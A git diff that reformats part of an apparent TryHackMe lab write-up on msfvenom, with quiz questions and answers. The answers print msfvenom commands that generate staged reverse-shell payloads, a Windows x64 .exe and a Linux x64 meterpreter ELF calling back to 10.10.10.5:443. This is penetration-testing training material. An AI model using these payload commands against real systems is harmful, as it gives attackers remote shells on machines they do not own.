@@ -511,12 +511,12 @@ This can be used to list all available payloads, which can then be piped into gr
 
 This gives us a full set of Linux meterpreter payloads for 32bit targets.  
 
-*Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.*
-*Answer: msfvenom -p windows/x64/shell/reverse_tcp LHOST=_TUN0_IP_ LPORT=_PORT_ -f exe -o shell.exe*
+*Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.*  
+*Answer:* msfvenom -p windows/x64/shell/reverse_tcp LHOST=_TUN0_IP_ LPORT=_PORT_ -f exe -o shell.exe
 
-*Which symbol is used to show that a shell is stageless?*
-*Answer: _*
+*Which symbol is used to show that a shell is stageless?*  
+*Answer:* _
 
-*What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell**
-*Answer: msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443*
+*What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell**  
+*Answer:* msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
 
